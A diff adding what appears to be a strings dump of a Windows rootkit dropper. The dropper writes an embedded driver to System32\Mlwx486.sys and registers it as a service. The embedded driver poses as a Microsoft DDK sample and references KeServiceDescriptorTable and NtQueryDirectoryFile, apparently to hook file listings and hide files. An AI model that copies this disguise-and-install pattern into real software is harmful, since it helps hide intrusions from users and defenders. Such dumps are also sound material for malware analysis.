@@ -1,0 +1,557 @@
+!This program cannot be run in DOS mode.
+q$9
+{$q
+z$"
+{$Rich
+.text
+`.rdata
+@.data
+.rsrc
+QSVWh
+jej
+ P@
+$P@
+jjh
+PWj
+PSV
+(P@
+hx`@
+_^[Y
+jjjjj
+hh`@
+hh`@
+hL`@
+_^[Y
+h0`@
+_^3
+_^[
+SVW
+0P@
+Hj@
+Dj@
+@j@
+<j@
+,P@
+Xj@
+\j@
+5Pj@
+5Lj@
+= j@
+= j@
+4P@
+Ytw
+ucj
+,j@
+$j@
+$j@
+u S
+X_[^
+Vt"
+t)V
+SVW
+ t;
+HHt
+*u#
+It.
+ht
+?6u
+HHtpHHtl
+Pt;
+Zt2
+Yt3
+HtQ
+ Yt
+ t!
+RPWV
+90u
+@t&
+Vj
+Vj0
+Y~2
+Vj
+_^[
+KVW
+_^[
+8o@
+Yu!j
+8o@
+8o@
+=Xc@
+ n@
+Ha@
+=pj@
+4o@
+_9=xj@
+<P@
+8P@
+=tj@
+pj@
+0o@
+,o@
+;50o@
+^h `@
+YYh(`@
+h$`@
+=xj@
+4P@
+;t$
+|j@
+|j@
+4I+
+`c@
+|j@
+@P@
+Xc@
+Xc@
+Xc@
+Xc@
+(o@
+VWu
+<=t
+5Xj@
+t9UW
+?=t"U
+$o@
+QQS3
+(o@
+VWu
+DP@
+5hj@
+PSSW
+PVW
+5Pj@
+Lj@
+8"uD
+"t)
+8"uF@
+8\u
+8"u,
+u%3
+ t?
+_^[
+-XP@
+VW3
+TP@
+@@f9
+@@f9
+=PP@
+SS@SSPVSS
+D$4
+t2U
+t#SSUP
+t$$VSS
+LP@
+uL;
+TP@
+t<8
+UWV
+HP@
+_^][YY
+DSUVWh
+5 n@
+ o@
+ n@
+hP@
+|$B
+D$D
+95 o@
+$n@
+Yt8
+ o@
+95 o@
+5 o@
+dP@
+ n@
+ n@
+`P@
+dP@
+5 o@
+\P@
+_^][
+9D$
+pP@
+lP@
+SVWUj
+]_^[
+SVW
+D$
+t.;t$$t(
+_^[
+VC20XC00U
+SVWU
+tEVU
+t3x<
+]_^[
+ j@
+u!h
+ j@
+DP@
+h T@
+<v)
+`P@
+9D$
+ o@
+ n@
+u7f
+~&WP
+SVW3
+95@
+8o@
+F;5@
+_^[
+w9j
+Ph
+PP@
+0j@
+;T$
+;D$
+;T$
+;D$
++D$
++D$
+Wtd
+WPS
+ n@
+_WPS
+^[]
+w*;
+u+Vj
+_^[
+VWj
+^95@
+8o@
+8o@
+8o@
+F;5@
+t$V
+YY^
+xP@
+SVW
+Y;5
+90tr
+0B=
+j@3
+j@3
+UAA
+_^[
+Wj@Y3
+t7SW
+
+_[j
+VPj
+VPV
+VPh
+@AA;
+=(o@
+(o@
+<3@
+ 3@
+|3@
+t3@
+l3@
+d3@
+\3@
+@5@
+H4@
+@5@
+X4@
+x4@
+@5@
+@5@
+@5@
+$5@
+75@
+@5@
+P5@
+X5@
+h5@
+|5@
+j?I_
+j?_
+IZ;
+=tP@
+ulSj
+xP@
+_^[
+;#M
+;#M
+uY;]
+D#M
+pD#U
+j #M
+j?^;
+ }+
+_^[
+VW3
+t*j
+xP@
+SVW
+j?i
+NCu
+_^[
+VWuBhhT@
+h\T@
+tPhLT@
+h8T@
+_^[
+tzVS
+GIt%
+t/Ku
+[^_
+GKu
+[^_
+ o@
+ n@
+t%P
+4j@
+0j@
+ o@
+ n@
+t_j
+X9E
+0j@
+4j@
+0j@
+=4j@
+%4j@
+0j@
+_^[
+ o@
+VWss
+ n@
+tVP
+0j@
+%4j@
+0j@
+_^[
+,j@
+tG3
+GIu
+GJu
+t4V
+SVW
+uFWWj
+[ShxT@
+"WWShtT@
+9} u
+E WW
+tfS
+tMWWS
+t@9}
+_^[
+WWu
+VSh
+PP@
++D$
+SVW
+^VhxT@
+PVhtT@
+WSV
+_^[
+0G@
+(H@
+@G@
+lG@
+(H@
+0H@
+<H@
+PH@
+`I@
+dI@
+lI@
+tI@
+|I@
+ o@
+WsU
+ n@
+%4j@
+0j@
+ o@
+ n@
+%4j@
+0j@
+4j@
+B=Hi@
+0j@
+0j@
+0j@
+0j@
+SUVW
+;= o@
+ n@
+tiW
+Yt<
+(P@
+%4j@
+0j@
+_^][
+%|P@
+EEE
+ (8PX
+700WP
+`h````
+ppxxxx
+(null)
+(null)
+runtime error
+TLOSS error
+SING error
+DOMAIN error
+R6028
+- unable to initialize heap
+R6027
+- not enough space for lowio initialization
+R6026
+- not enough space for stdio initialization
+R6025
+- pure virtual function call
+R6024
+- not enough space for _onexit/atexit table
+R6019
+- unable to open console device
+R6018
+- unexpected heap error
+R6017
+- unexpected multithread lock error
+R6016
+- not enough space for thread data
+abnormal program termination
+R6009
+- not enough space for environment
+R6008
+- not enough space for arguments
+R6002
+- floating point not loaded
+Microsoft Visual C++ Runtime Library
+Runtime Error!
+Program:
+...
+<program name unknown>
+GetLastActivePopup
+GetActiveWindow
+MessageBoxA
+user32.dll
+>D@
+BD@
+vF@
+zF@
+CloseHandle
+WriteFile
+SizeofResource
+CreateFileA
+LoadResource
+FindResourceA
+KERNEL32.dll
+CloseServiceHandle
+StartServiceA
+CreateServiceA
+OpenSCManagerA
+ADVAPI32.dll
+GetCommandLineA
+GetVersion
+ExitProcess
+TerminateProcess
+GetCurrentProcess
+UnhandledExceptionFilter
+GetModuleFileNameA
+FreeEnvironmentStringsA
+FreeEnvironmentStringsW
+WideCharToMultiByte
+GetEnvironmentStrings
+GetEnvironmentStringsW
+SetHandleCount
+GetStdHandle
+GetFileType
+GetStartupInfoA
+HeapDestroy
+HeapCreate
+VirtualFree
+HeapFree
+RtlUnwind
+HeapAlloc
+GetCPInfo
+GetACP
+GetOEMCP
+VirtualAlloc
+HeapReAlloc
+GetProcAddress
+LoadLibraryA
+GetLastError
+FlushFileBuffers
+SetFilePointer
+MultiByteToWideChar
+LCMapStringA
+LCMapStringW
+GetStringTypeA
+GetStringTypeW
+SetStdHandle
+D2@
+Failed to start service.
+Failed to create service.
+486 WS Driver
+Failed to open service manager.
+C:\Windows\System32\Mlwx486.sys
+FILE
+@Q@
+0Q@
+@o@
+@o@
+TS@
+0S@
+LR@
+$R@
+|Q@
+lQ@
+\Q@
+XQ@
+HQ@
+         (((((                  H
+FILE
+!This program cannot be run in DOS mode.
+Rich
+.text
+h.rdata
+H.data
+INIT
+.rsrc
+B.reloc
+u V
+E0uF
+u<Sj
+F^P2
+E0_^]
+Mlwx
+RSDS
+{ffI
+c:\winddk\7600.16385.1\src\general\rootkit\wdm\sys\objfre_wxp_x86\i386\sioctl.pdb
+98t
+KeServiceDescriptorTable
+NtQueryDirectoryFile
+RtlCompareMemory
+NtQueryDirectoryFile
+MmGetSystemRoutineAddress
+RtlInitUnicodeString
+KeTickCount
+ntoskrnl.exe
+VS_VERSION_INFO
+StringFileInfo
+040904B0
+CompanyName
+Windows (R) Win 7 DDK provider
+FileDescription
+Sample IOCTL Driver
+FileVersion
+6.1.7600.16385 built by: WinDDK
+InternalName
+SIOCTL.sys
+LegalCopyright
+ Microsoft Corporation. All rights reserved.
+OriginalFilename
+SIOCTL.sys
+ProductName
+Windows (R) Win 7 DDK driver
+ProductVersion
+6.1.7600.16385
+VarFileInfo
+Translation
+7"7.7V7[7b7s7
